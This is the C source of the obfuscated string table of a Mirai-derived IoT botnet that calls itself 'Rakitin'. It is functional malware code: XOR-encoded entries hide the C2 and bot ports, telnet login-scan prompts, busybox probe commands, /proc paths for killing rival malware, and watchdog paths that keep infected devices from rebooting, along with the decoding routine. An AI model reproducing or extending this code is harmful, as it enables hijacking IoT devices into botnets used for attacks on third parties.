#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/util.h"

uint32_t table_key = 0xdeaddaad;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_CNC_PORT, "\x22\xAA", 2); // 9902 [cnc-port]
    add_entry(TABLE_SCAN_CB_PORT, "\x5F\x9B", 2); // 23455 [bot-port]
    add_entry(TABLE_EXEC_SUCCESS, "\x56\x65\x6F\x6D\x70\x6D\x6A\x04", 8); // Rakitin
 
    add_entry(TABLE_SCAN_SHELL, "\x51\x4A\x47\x4E\x4E\x22", 6);
    add_entry(TABLE_SCAN_ENABLE, "\x47\x4C\x43\x40\x4E\x47\x22", 7);
    add_entry(TABLE_SCAN_SYSTEM, "\x51\x5B\x51\x56\x47\x4F\x22", 7);
    add_entry(TABLE_SCAN_SH, "\x51\x4A\x22", 3);
    add_entry(TABLE_SCAN_QUERY, "\x2B\x66\x6D\x6A\x2B\x66\x71\x77\x7D\x66\x6B\x7C\x24\x56\x45\x4F\x4D\x50\x4D\x4A\x04", 21); // /bin/busybox RAKITIN
    add_entry(TABLE_SCAN_RESP, "\x56\x45\x4F\x4D\x50\x4D\x4A\x3E\x24\x65\x74\x74\x68\x61\x70\x24\x6A\x6B\x70\x24\x62\x6B\x71\x6A\x60\x04", 26); // RAKITIN: applet not found
    add_entry(TABLE_SCAN_NCORRECT, "\x4C\x41\x4D\x50\x50\x47\x41\x56\x22", 9);
    add_entry(TABLE_SCAN_PS, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x52\x51\x22", 16);
    add_entry(TABLE_SCAN_KILL_9, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x49\x4B\x4E\x4E\x02\x0F\x1B\x02\x22", 22);

    add_entry(TABLE_KILLER_PROC, "\xC5\x9A\x98\x85\x89\xC5\xEA", 7);
    add_entry(TABLE_KILLER_EXE, "\xC5\x8F\x92\x8F\xEA", 5);
    add_entry(TABLE_KILLER_FD, "\xC5\x8C\x8E\xEA", 4);
    add_entry(TABLE_KILLER_MAPS, "\xC5\x87\x8B\x9A\x99\xEA", 6);
    add_entry(TABLE_KILLER_TCP, "\xC5\x9A\x98\x85\x89\xC5\x84\x8F\x9E\xC5\x9E\x89\x9A\xEA", 14);

    add_entry(TABLE_ATK_RESOLVER, "\x0D\x47\x56\x41\x0D\x50\x47\x51\x4D\x4E\x54\x0C\x41\x4D\x4C\x44\x22", 17);
    add_entry(TABLE_ATK_NSERV, "\x4C\x43\x4F\x47\x51\x47\x50\x54\x47\x50\x02\x22", 12);
 	
	add_entry(TABLE_MISC_WATCHDOG, "\x0D\x46\x47\x54\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 14);
	add_entry(TABLE_MISC_WATCHDOG2, "\x0D\x46\x47\x54\x0D\x4F\x4B\x51\x41\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 19);
	
	add_entry(TABLE_SCAN_ASSWORD, "\x43\x51\x51\x55\x4D\x50\x46\x22", 8);
	add_entry(TABLE_SCAN_OGIN, "\x4D\x45\x4B\x4C\x22", 5);
	add_entry(TABLE_SCAN_ENTER, "\x47\x4C\x56\x47\x50\x22", 6);
	
	add_entry(TABLE_MISC_RAND, "\x46\x49\x43\x4D\x55\x48\x44\x4B\x50\x4A\x4B\x43\x46\x13\x48\x11\x47\x46\x48\x49\x43\x4B\x22", 23);
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
